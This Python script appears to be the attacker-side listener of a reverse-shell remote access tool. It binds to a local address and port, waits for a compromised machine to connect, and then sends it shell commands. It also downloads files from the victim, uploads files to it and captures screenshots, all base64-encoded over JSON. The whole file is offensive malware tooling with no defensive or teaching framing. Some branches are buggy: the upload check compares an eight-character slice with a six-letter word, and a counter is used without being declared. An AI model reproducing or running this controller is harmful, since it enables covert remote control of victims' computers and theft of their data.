#!/usr/bin/python

import socket
from termcolor import colored
import json
import base64
count = 1
def relibale_send(data):
        json_data = json.dumps(data)
        target.send(bytes(json_data, 'utf-8'))

def reliable_recv():
        data = ""
        while True:
                try :
                        data = data + str(target.recv(1024).decode("utf-8"))
                        return json.loads(data)
                except ValueError:
                        continue



def shell():
	while True:
		command = input("* Shell#-%s: " % str(ip))
		print("Commansd came %s " % str(command))
		relibale_send(command)
		print("Command came %s " % str(command)) 
		if command =='q':
			break
		elif command[:2] == "cd" and len(command) >1:
			continue
		elif command[:8] == "download":
			with open(command[9:], "wb") as file:
				file_data = reliable_recv()
				file.write(base64.b64decode(file_data))
		elif command[:8] == "upload":
			try:
				with open(command[7:], "rb") as fin:
					relibale_send(base64.b64encode(fin.read()))
			except:
				failed = "failed to upload "
				relibale_send(base64.b64encode(failed))
		elif command[:10] == "screenshot":
			with open("screenhot%d" % count, "wb") as screen:
				image = reliable_recv()
				image_decoded = base64.b64decode(image)
				if image_decoded[:4] == ["[!!]"]:
					print(image_decoded)
				else:
					screen.write(image_decoded)
					count += 1

			
		else:
			result = reliable_recv()
			print(result)




def server():
	global s
	global ip
	global target
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
	s.bind(("192.168.0.21", 54321))
	s.listen(5)

	print(colored("[+] Listening for incoming Conncection","green"))
	target , ip = s.accept()
	print(target)
	print(colored("[+] Connection Established fpr : %s  " % str(ip) , "green"))
	

server()
shell()
s.close()
